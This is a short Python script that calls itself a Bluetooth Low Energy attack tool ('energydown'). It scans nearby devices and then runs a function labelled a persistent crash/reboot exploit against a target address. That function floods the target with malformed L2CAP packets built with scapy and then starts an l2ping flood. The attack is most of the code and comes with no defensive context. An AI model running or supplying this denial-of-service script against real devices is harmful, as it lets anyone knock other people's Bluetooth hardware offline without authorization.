import sys
from scapy.all import *
from bluepy import btle
import os

# Scan nearby Bluetooth Low Energy devices
def scan_devices():
    scanner = btle.Scanner()
    devices = scanner.scan(8.0)
    print("Discovered Devices:")
    for dev in devices:
        print("Device %s (%s), RSSI=%d dB" % (dev.addr, dev.addrType, dev.rssi))
        for (adtype, desc, value) in dev.getScanData():
            print("  %s = %s" % (desc, value))

# Craft exploit packets for crash + reboot persistence
def sweyn_persist_attack(target_addr):
    print("[*] Launching persistent crash/reboot exploit on:", target_addr)
    # Packet flooding with malformed L2CAP + ATT sequences
    for i in range(50):
        pkt = BTLE_DATA() / L2CAP_Hdr(len=512, cid=0x004) / Raw(b"\xff" * 512)
        sendp(pkt, iface="hci0", count=5, inter=0.05, verbose=False)
    # Trigger repeated reconnect attempts to maintain instability
    os.system(f"l2ping -i hci0 -s 600 -f {target_addr}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 energydown <target_bt_addr>")
        scan_devices()
    else:
        target = sys.argv[1]
        sweyn_persist_attack(target)
